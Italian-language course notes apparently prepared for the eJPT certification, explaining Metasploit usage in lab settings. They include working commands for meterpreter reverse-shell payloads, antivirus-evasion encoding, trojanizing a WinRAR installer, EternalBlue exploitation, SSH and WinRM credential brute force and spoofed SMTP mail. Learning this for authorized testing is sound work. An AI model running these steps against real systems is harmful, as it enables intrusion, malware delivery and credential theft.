# Host & Network Penetration Testing: The Metasploit Framework (MSF)

## Metasploit Framework Overview

### Terminologia essenziale

* Interface (Interfaccia): Metodi per interagire con il Metasploit Framework.
* Module (Modulo): Frammenti di codice che eseguono un compito particolare; un esempio di modulo è l'exploit.
* Vulnerability (Vulnerabilità): Debolezza o falla in un sistema informatico o in una rete che può essere sfruttata.
* Exploit: Frammento di codice o modulo utilizzato per trarre vantaggio da una vulnerabilità all'interno di un sistema, servizio o applicazione.
* Payload: Frammento di codice consegnato al sistema target da un exploit con l'obiettivo di eseguire comandi arbitrari o fornire accesso remoto a un attaccante.
* Listener (Ascoltatore): Un'utility che resta in attesa di una connessione in entrata proveniente da un target.

### Metasploit Framework Interfaces <a href="#metasploit-framework-interfaces" id="metasploit-framework-interfaces"></a>

| MSFconsole        | Interfaccia principale "all-in-one" che fornisce accesso a tutte le funzionalità.         | La più usata nel corso e nell'esame.                               |
| ----------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| MSFcli            | Utility a riga di comando per facilitare la creazione di script di automazione.           | Dismessa nel 2015; le sue funzioni sono ora incluse in MSFconsole. |
| Armitage          | GUI basata su Java che semplifica discovery, exploit e post-exploit.                      | Ottima per visualizzare graficamente gli host compromessi.         |
| Community Edition | Interfaccia GUI basata su web per semplificare discovery e identificazione vulnerabilità. | Soluzione orientata al browser.                                    |
|                   |                                                                                           |                                                                    |

### Moduli e Componenti del MSF

* **Exploit**: Sfrutta una vulnerabilità, solitamente accoppiato a un payload.
* **Payload**: Codice eseguito post-exploitation (es. una _reverse shell_ che connette il target all'attaccante).
* **Encoder**: Utilizzato per offuscare i payload ed evitare il rilevamento da parte degli antivirus (es. `shikata_ga_nai`).
* **NOPS**: Assicurano la stabilità del payload e che le dimensioni siano consistenti durante l'esecuzione.
* **Auxiliary**: Moduli per funzionalità aggiuntive come port scanning ed enumerazione (non caricano payload).

### Tipi di Payload

Quando si configura un attacco, MSF mette a disposizione due tipologie principali:

1. **Non-Staged Payload:** Inviato al sistema target "così com'è" insieme all'exploit in un unico blocco.
2. **Staged Payload:** Inviato in due parti:
   * **Stager**: Stabilisce un canale di comunicazione stabile tra attaccante e target.
   * **Stage**: I componenti del payload vero e proprio scaricati successivamente dallo stager.

#### Meterpreter Payload (Meta-Interpreter)

È il payload più avanzato di Metasploit:

* Esecuzione in memoria: Viene eseguito interamente nella memoria del target, rendendo molto difficile il rilevamento da parte delle analisi forensi.
* Funzionalità: Fornisce un interprete di comandi interattivo per navigazione nel file system, keylogging ed esecuzione di comandi di sistema.

### Struttura del File System e Percorsi

Conoscere la posizione dei moduli è utile per aggiungere script personalizzati:

* Directory di Sistema (Linux): `/usr/share/metasploit-framework/modules`.
* Directory Utente (Linux): `~/.ms4/modules` (per moduli personalizzati dell'utente, da caricare suddividendoli per sistema operativo / programma o servizio).
* Struttura generale: Il file system è organizzato in cartelle chiare come `app`, `config`, `data`, `db`, **`modules`**, `plugins`, `scripts` e `tools`.

### Fasi del Penetration Test con MSF

#### Il Penetration Testing Execution Standard (PTES)

Il PTES è una metodologia di penetration testing sviluppata da un team di professionisti della sicurezza informatica.

* Obiettivo: Offrire uno standard completo e aggiornato per l'esecuzione dei test di sicurezza.
* Roadmap: MSF può essere adottato come roadmap per comprendere le varie fasi che compongono un penetration test e come integrarsi in ognuna di ess

<figure><img src="../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

Metasploit Framework copre l'intero ciclo di vita dell'attacco:

| Information Gathering & Enumeration | Moduli Auxiliary e integrazione con Nmap.               |
| ----------------------------------- | ------------------------------------------------------- |
| Vulnerability Scanning              | Moduli Auxiliary e Nessus.                              |
| Exploitation                        | Moduli Exploit e Payloads.                              |
| Post Exploitation                   | Meterpreter e moduli Post.                              |
| Privilege Escalation                | Moduli Post e Meterpreter.                              |
| Maintaining Persistent Access       | Moduli di Persistence e Post, Meterpreter.              |
| Clearing Tracks                     | Pulizia dei log (es. Windows Event Log) o bash history. |

## MSFconsole fundamentals

La msfconsole è l'interfaccia principale del Metasploit Framework, progettata per essere un ambiente "all-in-one" facile da usare per accedere a tutte le funzionalità del framework.

### 🛠️ Navigazione e Comandi Base

* `msfconsole`: Avvia l'interfaccia.
* `help`: Mostra i comandi disponibili.
* `version`: Mostra la versione del framework.
* `show -h`: Visualizza l'help specifico per qualsiasi comando (es. `show -h`).
* `show all`: Mostra tutti i moduli disponibili nel framework.
* `show exploits`: Elenca solo i moduli di tipo exploit.
* `back` / `exit`: Esce dal modulo attuale o chiude la console.

### 🔍 Ricerca e Selezione Moduli

* `search [keyword]`: Cerca moduli per nome o funzione (es. `search portscan`).
* `search cve:2017 type:exploit platform:windows`: Ricerca avanzata filtrata per CVE, tipo di modulo e sistema operativo.
* `use [percorso/id]`: Seleziona un modulo (es. `use auxiliary/scanner/portscan/tcp` o `use 0` dai risultati della ricerca).
* `info`: Fornisce dettagli critici sul modulo selezionato (descrizione, opzioni, target).

### ⚙️ Configurazione Variabili (MSF Variables)

I moduli richiedono informazioni come IP e porte per avviare la connessione.

| **Variabile** | **Scopo**                                               |
| ------------- | ------------------------------------------------------- |
| `RHOSTS`      | Indirizzo IP del target (o range/lista di IP).          |
| `RPORT`       | Porta target sul sistema vittima.                       |
| `LHOST`       | Indirizzo IP del sistema attacker (per reverse shell).  |
| `LPORT`       | Porta sul sistema attacker per ricevere la connessione. |

* `show options`: Mostra i parametri necessari.
* `set [VAR] [VALORE]`: Imposta una variabile locale (es. `set RHOSTS 192.168.2.1`).
* `set payload [percorso]`: Cambia il payload predefinito (es. per passare da 64 a 32 bit).

### 🧨 Esecuzione e Gestione

* `run` / `exploit`: Avvia l'esecuzione del modulo o dell'attacco.
* `sessions`: Elenca le sessioni attive ottenute.
* `sessions -i [ID]`: Interagisce con una sessione specifica.

### 🌐 Funzionalità Aggiuntive

* `connect`: Comando simile a `netcat`.
  * Utilizzato per connessioni dirette a un host.
  * Utile per il Banner Grabbing: rivela informazioni sul servizio e sulla porta utilizzata dall'attacker IP.

### Creating & Managing Workspaces

I Workspace permettono di tenere traccia di host, scansioni e attività in modo organizzato, evitando di mischiare i dati tra diversi target o organizzazioni. Tutti i dati vengono salvati nel database di Metasploit (MSF DB).

{% hint style="info" %}
Importante: Assicurati che il database sia attivo per non perdere i dati al riavvio della console.
{% endhint %}

* `db_status`: Verifica che msfconsole sia correttamente connessa al database PostgreSQL.
* `workspace`: Elenca i workspace esistenti. Quello attivo è contrassegnato da un asterisco (`*`).
* `workspace -a [NOME]`: Crea un nuovo workspace (es. `workspace -a INE`).
* `workspace [NOME]`: Passa a un workspace specifico.
* `workspace -r [VECCHIO] [NUOVO]`: Rinomina un workspace esistente (es. `workspace -r INE PTA`).
* `workspace -d [NOME]`: Elimina un workspace.
* `hosts`: Visualizza gli host salvati nel database del workspace attuale.

```
db_status //test della connessione al DB
workspace -h
workspace
host
workspace -a Test
workspace
hosts
workspace default
hosts
workspace -a INE //creiamo un workspace per ogni company name per i vari pentest nella vita reale
workspace
workspace Test
workspace -d Test //per eliminare il workspace
workspace
workspace -r INE PTA //per rinominare un workspace, in questo caso da INE a PTA
workspace
```

## Enumeration

### Port Scanning & Enumeration with Nmap

Utilizziamo Nmap in particolare perché i suoi risultati possiamo importarli nel MSF (Metasploit Framework) per vulnerability detection e exploitation.

Per trovare versioni dei servizi running sulle porte aperte e l'OS:

```
nmap -Pn -sV -O <IP>
```

Salvare i risultati in XML:

```
nmap -Pn -sV -O <IP> -oX nome_file.xml
```

### Importing Nmap Scan Results into MSF

#### Caricare file xml nel DB metasploit

1. Avviare il DB metasploit: `service postgresql start`
2. Entrare in metasploit: `msfconsole`
3. Creare un nuovo workspace: `workspace -a <nome workspace>`
4. Verificare che siamo nel nuovo workspace: `workspace`
5. Caricare il file XML: `db_import nomefile.xml`
6. Verificare che sia caricato con i comandi: `hosts, services, vulns`&#x20;

Si può anche inizializzare e performare una nmap scan direttamente dentro metasploit ed il cui output verrà automaticamente inserito nel database:

```
db_nmap <comando>
db_nmap -Pn -sV -O <IP>
```

## Port Scanning With Auxiliary Modules (Pivoting intro)

## 🪜 Pivoting e Scansione Post-Exploitation

Il Pivoting è la tecnica che permette di utilizzare una macchina già compromessa (Vittima 1) come "ponte" per attaccare o scannerizzare altri sistemi in una rete interna non raggiungibile direttamente dall'attaccante.

Passaggi del pivoting:

1. Otteniamo una meterpreter shell sul primo target che è connesso a internet
2. Aggiungiamo una network route che ci permetta di utilizzare gli auxiliary modules per scannerizzare un secondo target non connesso a internet, ma connesso alla rete interna del nostro primo target.
3. Questo per identificare l'IP del secondo target e poi eseguire un port scan su di esso

### 🌉 Configurazione del Pivoting con Autoroute

Dopo aver ottenuto una sessione Meterpreter sulla prima vittima, segui questi passaggi per instradare il traffico attraverso di essa:

1. Mettere la sessione in background:
   * Usa `CTRL+C` o digita `background`.
2. Configurare la Route:
   * Si utilizza il modulo `autoroute` per dire a Metasploit di inviare il traffico per la rete interna attraverso la sessione attiva.
   * Comando rapido da msfconsole: `route add [IP_RETE_INTERNA] [SUBNET_MASK] [ID_SESSIONE]`.
   * Oppure usa il modulo post: `use post/multi/manage/autoroute`.

### 🔍 Port Scanning della Rete Interna

Una volta impostata la route, tutti i moduli Auxiliary di Metasploit passeranno automaticamente attraverso la Vittima 1 (Pivot Point).

#### Scansione TCP

Per trovare host e servizi nella rete nascosta:

1. `use auxiliary/scanner/portscan/tcp`
2. `set RHOSTS [IP_SECONDO_TARGET]`
3. `run`

* Risultato: Metasploit contatta la Vittima 1, che a sua volta scansiona la Vittima 2 e riporta i risultati all'attaccante.

#### Scansione UDP (Discovery)

Per identificare servizi UDP attivi:

1. `use auxiliary/scanner/discovery/udp_sweep`
2. `set RHOSTS [IP_TARGET]`
3. `run`

* Questo modulo è utile per identificare rapidamente servizi comuni come DNS, SNMP o NetBIOS in una rete interna.

***

### 🎯 Conclusioni sulla Sessione Pratica

L'utilità degli Auxiliary Modules non si limita alla fase iniziale di _Information Gathering_:

* Inizialmente: Si usano per mappare i target visibili.
* In Post-Exploitation: Diventano essenziali per fare Pivoting e scoprire nuovi host all'interno di reti segmentate.

{% hint style="info" %}
Ricorda per l'esame: Se dopo aver compromesso una macchina vedi che ha una seconda interfaccia di rete (es. `eth1` con un IP diverso), quello è il segnale che devi fare pivoting!
{% endhint %}

### Tip: Connessione diretta al DB (al di fuori di MSF)

```
mysql -h <IP target> -u <username> -p
// ora che siamo connessi dentro al DB possiamo fare tutte le query che vogliamo.
```

## SSH Enumeration

### Avvio Metasploit framework

```
service postgresql start
msfconsole
workspace -a SSH_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:ssh
```

### SSH version enumeration

```
use auxiliary/scanner/ssh/ssh_version
run
```

### SSH users enumeration

```
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

### SSH bruteforce delle credenziali

```
use auxiliary/scanner/ssh/ssh_version  // se il target usa l'autenticazione via user e password
use auxiliary/scanner/ssh/ssh_login    // se il target usa l'autenticazione con chiave public/private
show options
// meglio ridurre la BRUTEFORCE_SPEED perché i log di solito vengono inviati a un Sys Log Server e quindi potrebbe scattare qualche allarme
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt //oppure unix_passwords.txt
run
// terminiamo la sessione aperta automaticamente con CTRL+C
sessions
session 1
/bin/bash -i   // per aprire una shell interattiva nella sessione 1
```

Questo modulo apre in automatico anche un terminale con SSH sul target, però in realtà se proviamo a scrivere qualche comando non funziona, quindi bisogna terminarlo con CTRL+C e poi se scriviamo il comando sessions possiamo vedere che ne ha attivata una in automatico al posto nostro.

Però se poi entriamo nella sessione attiva e scriviamo ls non vediamo il risultato, allora dobbiamo aprire una shell interattiva con il comando _/bin/bash -i_

## SMTP Enumeration

Con SMTP possiamo trovare un elenco degli utenti presenti sul sistema, e di conseguenza possiamo usare questi utenti per fare dei brute force su SSH o altri protocolli.

### Avvio Metasploit Framework

```
service postgresql start
msfconsole
workspace -a SMTP_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:smtp
```

### SMTP version enumeration

```
use auxiliary/scanner/smtp/smtp_version
run
```

### SMTP user enumeration

```
use auxiliary/scanner/smtp/smtp_enum     // user enumeration
// set USER_FILE /usr/share/commix/src/txt/usernames.txt  // è una alternativa con root come utente + altri comuni
// set /usr/share/metasploit-framework/data/wordlists/unix_users.txt  // è quella di default
run
```

UNIXONLY è true perché sappiamo che è un sistema linux, stesso motivo per cui lo USER\_FILE è la default unix\_users.txt

#### Alternativa senza Metasploit: comando smtp-user-enum

```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
```

### SMTP server name e banner

```
nmap -sV -script banner demo.ine.local
```

### Connessione con netcan

#### Connessione + banner e servername

```
nc demo.ine.local 25
```

#### Verificare esistenza di un utente

```
VRFY admin@openmailbox.xyz   // dove admin è username e openmailbox.xyz è servername
```

Se restituisce 252, e in generale non un errore, allora significa che esiste

#### Inviare mail via telnet

```
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

#### Comandi utili

{% embed url="https://www.samlogic.net/articles/smtp-commands-reference.htm" %}

### Inviare una mail con sendemail

```
sendemail -f admin@attacker.xyz -t victimuser@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi 
```

## Vulnerability Scanning con MSF

L'obiettivo è identificare i servizi attivi sul target e mappare le vulnerabilità sfruttando sia i moduli interni di Metasploit che strumenti esterni come `searchsploit`.

### 🔍 Information Gathering & Database Setup

Iniziamo identificando il target nella rete e popolando il database di MSF.

Bash

```
sudo nmap -sn 10.10.10.1/24  # Identificazione host attivi
service postgresql start
msfconsole
workspace -a MS3
setg RHOSTS 10.10.10.4
db_nmap -sS -sV -O 10.10.10.4  # Scan e import automatico nel DB
hosts
services
```

### 🛠️ Ricerca Vulnerabilità (Metodo Manuale)

Dopo aver elencato i servizi, cerchiamo i moduli corrispondenti all'interno di MSF.

Bash

```
search iis  # Esempio per Microsoft IIS
search glassfish
```

#### Analisi dei moduli e Payload

Quando troviamo un modulo, dobbiamo verificarne la compatibilità tramite il comando `info`.

Bash

```
use exploit/multi/http/glassfish_deployer
info
# Verificare 'Description' e 'Targets' per conferma versione
set PAYLOAD windows/meterpreter/reverse_tcp  # Cambio payload in base all'OS target
show options
# Impostare variabili mancanti: APP_RPORT, TARGETURI, USERNAME, etc.
```

### 🔎 Ricerca tramite Searchsploit (CLI Linux)

Utility esterna a MSF per interrogare il database di Exploit-DB.

Bash

```
# Ricerca generale
searchsploit windows 7

# Filtrare solo i moduli già pronti per Metasploit
searchsploit windows 7 | grep -e "Metasploit"
```

### 💎 Caso Studio: EternalBlue (MS17-010)

Esempio di scansione specifica e verifica della vulnerabilità prima dell'exploit.

Bash

```
# 1. Ricerca del modulo di scansione (Auxiliary)
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
run
# Se il risultato indica "Host is likely VULNERABLE", procediamo.

# 2. Esecuzione Exploit
use exploit/windows/smb/ms17_010_eternalblue
set LHOST <IP Attaccante>
exploit
```

### 🤖 Automazione e Analisi

Esistono strumenti e plugin per velocizzare l'identificazione degli exploit.

#### Comando Analyze

Comando nativo che incrocia i dati del database (host/servizi) con i moduli disponibili.

Bash

```
analyze  # Mostra exploit suggeriti basati su servizi e versioni nel DB
vulns    # Elenca le vulnerabilità con relative CVE associate
```

#### Plugin DB Autopawn

Plugin aggiuntivo (da installare manualmente nelle versioni recenti) che associa automaticamente le porte aperte agli exploit.

Bash

```
cd Downloads/
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
// Torniamo in metasploit
load db_autopawn
db_autopawn
```

{% hint style="info" %}
Attenzione: DB Autopawn è meno preciso dell'analisi manuale; potrebbe suggerire exploit per OS errati (es. moduli Samba/Linux su target Windows). È sempre necessaria l'enumerazione manuale del sistema operativo.
{% endhint %}

## Nessus: Vulnerability Scanning

### Installare Nessus Essentials

Visitare la pagina tenable.com/products/nessus e scaricare Nessus Essentials per Debian/Kali Linux.

```
cd Downloads
chmod + Nessus-10.0.0-debian6_amd64.deb
sudo dpkg -i Nessus-10.0.0-debian6_amd64.deb
```

### Avviare Nessus e fare uno scan

```
// Per avviare:
sudo systemctl start nessusd.service
// visita la pagina https://kali:8834/
```

* Selezionare Basic Network Scan che corrisponde ad una full system scan.
* Una volta selezionati i parametri e configurati gli IP avviare lo scan.
* Terminato lo scan visualizzare i risultati nel tab "Vulnerabilities".
* Se non si cambia il filtro di default vengono visualizzati i risultati partendo dall'applicazione che ha più vulnerabilità.
* All'interno della pagina di dettagli delle vulnerabilità le informazioni importanti mostrate sono CVE, CVSS, exploits available ed exploitable with dalla colonna di destra.

Filtri utili:

* impostando il filtro Metasploit Exploit Framework a true troviamo le vulnerabilità che sono exploitabili con Metasploit.
* Per Severity = High, Critical ...

### Esportare i risultati dello Scan

Nella pagina dei risultati dello scan, in alto a destra: Esportare i risultati come "Export > Nessus" e importarli nel DB di Metasploit Framework

### Avviamo MSF Console per importarci i risultati di Nessus

```
msfconsole
workspace -a MS3_Nessus
db_import /home/kali/Downloads/MS3_fkthix.nessus
hosts
services
vulns
```

Per limitare i risultati delle vulnerabilità ad un solo servizio, es. SMB, devo specificare la porta:

```
vulns -p 445
```

Per trovare i moduli exploit per una particolare vulnerabilità si può inserire il CVE (o anche solo l'anno) o il Microsoft Vulnerability Identifier nella ricerca, e poi specificare il servizio (es. SMB):

```
search cve:2017 name:smb
search cve:2012 name:rdp
search MS12-020
search cve:2015 name:MenageEngine
```

## WMAP: Web App Vulnerability Scanning

```
service postgresql start
msfconsole
workspace -a Web_Scanning
setg RHOSTS 192.157.89.3
load wmap
wmap_sites -a 192.157.89.3
wmap_targets -t http://192.157.89.3
wmap_sites -l
wmap_targets -l
```

### Eseguire moduli Metasploit compatibili con WMAP

```
wmap_run -h
wmap_run -t //identifica tutti i moduli auxiliary compatibili con il target
wmap_run -e //esegue i moduli compatibili trovati prima
```

wmap\_run -t va a cercare tutti i moduli auxiliary che possono essere utili per il nostro target.&#x20;

wmap\_run -e va a usare tutti i moduli che possono essere utili per il nostro target e webserver, non tutti in generale.

Osservare bene il contenuto della wmap\_run -e per identificare l'esito della http enumeration. \
In particolare fare attenzione a:

* le chiamate HTTP supportate (la PUT ci consente di caricare file exploit per reverse shell
* Il file robots.txt che identifica le cartelle nascoste (es. data e secure)
* vengono identificate le varie cartelle e file trovati sul server
* Vulnerabilità a SQL injection o path traversal

#### Listare tutte le vulnerabilità, misconfigurazioni e informazioni trovate sul target

```
wmap_vulns -h
wmap_vulns -l
```

### Identificare path con HTTP PUT abilitata

Se riuscissimo a trovare una cartella dove è possibile inserire un file tramite HTTP PUT sarebbe ideale per caricare exploit e ottenere una reverse shell.

#### Verificare metodi supportati sulla root del sito

```
use auxiliary/scanner/http/options
show_options
run
```

#### Verificare supporto PUT per singole cartelle (es. quelle in robots.txt)

```
use auxiliary/scanner/http/http_put
show options
set PATH /data/
run
```

Prossimi passi di un attaccante/pentester: caricare una reverse shell payload in PHP sul webserver e visitare il sito da browser per fare in modo che venga eseguito il file e ci troveremmo una connessione reverse shell attiva sul nostro netcat listener.

## Client-Side Attacks: Generating Payloads With Msfvenom

I Client-side attacks richiedono che la vittima esegua un file malevolo. A differenza degli attacchi basati su servizi, qui il vettore è l'interazione dell'utente. Utilizziamo `msfvenom` per generare questi payload (eseguibili, script, ecc.).

### 📝 Concetti Chiave sui Payload

#### Struttura del Nome

La nomenclatura segue questo standard: `OS/Architettura/Tipo_Payload/Protocollo` _Esempio:_ `windows/x64/meterpreter/reverse_https` (L'uso di HTTPS è consigliato per cifrare il traffico e bypassare alcuni controlli di rete).

#### Staged vs Unstaged

* Staged (`/`): Inviato in due fasi. Piccolo stager che scarica il resto del payload.
  * _Esempio:_ `windows/meterpreter/reverse_tcp`
* Unstaged (`_`): Payload completo inviato in un unico blocco. Più stabile ma più grande.
  * _Esempio:_ `windows/meterpreter_reverse_tcp`

### 🛠️ Generazione Payload con Msfvenom

#### Windows (Eseguibile .exe)

<pre><code><strong>// Creare un payload per windows 32 bit
</strong>msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=&#x3C;IP Attaccante> LPORT=&#x3C;Porta in ascolto> -f exe > /home/kali/Desktop/Windows_Payload/payloadx86.exe
// Creare un payload per windows 64 bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=&#x3C;IP Attaccante> LPORT=&#x3C;Porta in ascolto> -f exe > /home/kali/Desktop/Windows_Payload/payloadx64.exe
</code></pre>

#### Linux (Eseguibile .elf)

Bash

```
// Creare un payload per linux 32 bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Attaccante> LPORT=<Porta in ascolto> -f elf > /home/kali/Desktop/Linux_Payloads/payloadsx86
// Creare un payload per linux 64 bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP Attaccante> LPORT=<Porta in ascolto> -f elf > /home/kali/Desktop/Linux_Payloads/payloadsx64
```

#### Formati Supportati

Per vedere tutti i formati disponibili (Executable vs Transform):

```
msfvenom --list formats
```

### 🚚 Trasferimento e Hosting del Payload

Un metodo rapido per trasferire il file sulla vittima è sollevare un server web temporaneo in Python nella cartella dove risiede il payload:

```
# Nella cartella del payload
python3 -m http.server 80
```

Dalla vittima, basterà navigare all'indirizzo IP dell'attaccante tramite browser o `wget`/`certutil` per scaricare il file.

### 🎣 Configurazione del Multi/Handler

Per gestire la connessione di ritorno (Reverse Shell) da un payload Meterpreter, è necessario configurare l'handler appropriato in MSF.

```
service postgresql start
msfconsole

use exploit/multi/handler

# IMPORTANTE: Il payload deve coincidere esattamente con quello generato
set payload windows/meterpreter/reverse_tcp 
# Per Linux: set payload linux/x86/meterpreter/reverse_tcp

set LHOST <IP_Attaccante>
set LPORT <Porta_usata_in_msfvenom>

run
```

### 🚀 Esecuzione e Sessione

Una volta che l'handler è in ascolto (`[*] Started reverse TCP handler on...`):

1. Si esegue il file sul target (es. doppio click su `payload.exe`).
2. L'handler riceve la connessione e apre la sessione Meterpreter.
3. Se la shell non risponde correttamente (es. in Linux), provare a spawnare una bash interattiva: `/bin/bash -i`.

> \[!TIP] Nota Operativa: Se esegui un payload e l'handler non riceve nulla, controlla che il firewall del target non stia bloccando la porta in uscita o che l'antivirus non abbia rimosso il file prima dell'esecuzione.

## Client-Side Attacks: Encoding Payloads with Msfvenom

### Elencare gli encoders in msfvenom

```
msfvenom --list encoders
```

Gli unici due encoders che hanno un Rank excellent sono:

* cmd/poweshell\_base64, utile per quando dobbiamo fare encoding di un codice Powershell
* x86/shikata\_ga\_nai, utile per encoding di payload windows e linux.

### Generare un payload con encoding con shikata\_ga\_nai

#### Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > home/kali/Desktop/Windows_Payloads/encoded/x86.exe
// possiamo specificare il numero di iterazioni con -i
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > home/kali/Desktop/Windows_Payloads/encoded/x86.exe
```

Con shikata ga nai possiamo fare encoding con una iterazione o con quante vogliamo, più iterazioni facciamo più è probabile bypassare un antivirus. Più di 10 iterazioni non aiuta molto a bypassare un antivirus, quindi 10 diciamo che è il massimo per capire se riusciamo a bypassare oppure no.

#### Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > home/kali/Desktop/Linux_Payloads/encoded/x86.exe
```

## Client Side Attacks: Injecting Payloads Into Windows Portable Executables

Questa tecnica consiste nell'utilizzare un eseguibile legittimo come "template" per ospitare il nostro payload. L'obiettivo è rendere il file meno sospetto agli occhi dell'utente e mantenere i metadati del software originale.

### 🛠️ Generazione e Iniezione con Msfvenom

Utilizziamo il parametro `-x` per specificare il file legittimo da usare come base (es. l'installer di WinRAR).

```
# Esempio di iniezione in WinRAR (senza mantenimento funzioni originali)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /home/kali/Downloads/wrar602.exe > /home/kali/Desktop/Windows_Payloads/winrar.exe
```

#### Parametri Chiave:

* `-x [path]`: Specifica l'eseguibile personalizzato da usare come template.
* `-k` (Keep): Indica a msfvenom di preservare il comportamento del file originale (l'eseguibile funzionerà normalmente mentre il payload gira in un thread separato).
* `-e [encoder]`: Utilizza un encoder (es. `shikata_ga_nai`) per tentare di offuscare il codice.
* `-i [numero]`: Numero di iterazioni dell'encoding per aumentare l'offuscamento.

### 🚚 Trasferimento e Listening

Come per i payload standard, dobbiamo ospitare il file e preparare l'accoglienza della connessione.

```
# 1. Avvio Web Server per il trasferimento
sudo python3 -m http.server 80

# 2. Configurazione Multi/Handler in MSF
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

### 🚀 Esecuzione sul Target e Comportamento

Quando la vittima esegue il file `winrar.exe` generato:

1. Senza `-k`: Il payload viene eseguito e riceviamo la sessione su Metasploit, ma l'installazione di WinRAR non parte. Il file mantiene però l'icona e i metadati originali.
2. Con `-k`: Il payload viene eseguito e l'installazione di WinRAR parte regolarmente, rendendo l'attacco quasi invisibile all'utente.

{% hint style="info" %}
Limitazione di `-k`: L'opzione per mantenere le funzionalità originali non è supportata da tutti gli eseguibili. Ad esempio, l'installer di WinRAR (`wrar602.exe`) fallisce se viene usato il flag `-k`.
{% endhint %}

### 🛡️ Post-Exploitation: Migrazione del Processo

Se abbiamo iniettato il payload in un processo che l'utente potrebbe chiudere (come un installer), perderemmo la sessione. È fondamentale migrare immediatamente il processo in uno più stabile (es. `notepad.exe` o `explorer.exe`).

```
# All'interno della sessione Meterpreter
run post/windows/manage/migrate
```

Questo comando sposta automaticamente la nostra esecuzione in un nuovo processo, garantendo la persistenza della connessione anche se l'eseguibile originale viene terminato.

## Client-Side Attacks: Automating Metasploit With Resource Scripts

I file .rc (Resource Scripts) automatizzano sequenze di comandi in MSFconsole.

### Posizione e Avvio

* Script già preconfigurati, di sistema: `/usr/share/metasploit-framework/scripts/resource/`
* Eseguire all'avvio (da terminale): **`msfconsole -r script.rc`**
* Eseguire dentro MSF: **`resource /path/script.rc`**

### 🛠️ Creazione Manuale

Crea un file `.rc` e scrivi i comandi come faresti in console:

```
# Esempio: listener.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

### 💾 Esportazione Rapida (makerc)

Per salvare i comandi appena digitati e creare uno script istantaneamente:

```
makerc /home/kali/Desktop/scansione.rc
```

{% hint style="info" %}
\[!TIP] Uso rapido eJPT: Crea uno script per ogni Multi/Handler che usi spesso. Se perdi la connessione, lo riavvii con un solo comando invece di settare ogni volta LHOST/LPORT.
{% endhint %}

## Windows Exploitation

### Exploiting A Vulnerable HTTP File Server

#### Portscanning & Enumeration

```
service postgresql start
msfconsole
sb_status
workspace -a HFS
setg RHOSTS 10.2.24.160
db_nmap -sS -sV -O 10.2.24.160
```

### Exploit

```
search type:exploit name:rejetto
show options
info
run
// e apre già automaticamente una connessione meterpreter
//ma potremmo specificare il payload e i parametri LPORT e LHOST a piacimento
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST <LHOST_IP>
set LPORT <PORT>
run
```

### Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
service postgresql start
msfconsole
workspace -a EternalBlue
db_nmap -sS -sV -O 10.10.10.7
services
// Controlliamo se è vulnerabile a EternalBlue
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.7
run
// Effettuiamo l'exploit vero e proprio
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.7 //target IP
exploit
```

Questo exploit in particolare è molto potente perché con un solo passaggio (l'uso di un solo modulo metasploit) abbiamo accesso con credenziali amministrative. Quindi non dobbiamo fare privilege escalation.

### Exploiting WinRM (Windows Remote Management Protocol)

Il protocollo WinRM permette la gestione remota di sistemi Windows. Non è abilitato di default, ma se attivo (solitamente porte 5985 HTTP o 5986 HTTPS), rappresenta un potente vettore di attacco.

#### 🔍 Enumerazione e Verifica Metodi di Autenticazione

Prima di tentare l'accesso, verifichiamo i metodi supportati dal target.

```
service postgresql start
msfconsole
workspace -a WinRM  # Organizzazione dati
db_nmap -sS -sV -O -p- 10.4.22.219 # Scan database

# Verifica metodi di autenticazione
use auxiliary/scanner/winrm/winrm_auth_methods
setg RHOSTS 10.4.22.219 # Variabile globale
run
```

#### 🔨 Brute-force delle Credenziali

Se il target supporta l'autenticazione Basic o Negotiate, possiamo tentare il brute-force.

```
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set PASSWORD anything  # Obbligatorio nelle versioni recenti di MSF per avviare il modulo
set VERBOSE false
exploit
```

